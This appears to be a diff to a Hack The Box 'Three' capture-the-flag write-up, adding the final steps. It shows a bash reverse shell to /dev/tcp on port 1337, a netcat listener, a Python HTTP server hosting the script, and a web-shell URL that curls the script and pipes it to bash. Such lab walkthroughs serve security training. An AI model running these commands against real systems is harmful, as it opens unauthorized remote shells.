@@ -94,6 +94,23 @@ which will connect back to our local machine on port 1337 ._
 **#!/bin/bash**
 **bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1**
 
+_will start net cat listener by command **nc -nvlp 1337**_
+
+_in addtion to will start http local server on port 8000 and host this bash file and we must open http server from directory which have bash file_
+
+_by this command will start http server **python3 -m http.server 8000**_
+
+![](/Assets/HTB/THREE/assets/httpremote.png)
+
+_we will use **curl** to fetch the bash file and do that in browser by this **http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash**_ 
+
+![](/Assets/HTB/THREE/assets/remote.png)
+
+![](/Assets/HTB/THREE/assets/flag.png)
+
+
+
+_**Thanks for watching my Blog**_
 
 
 
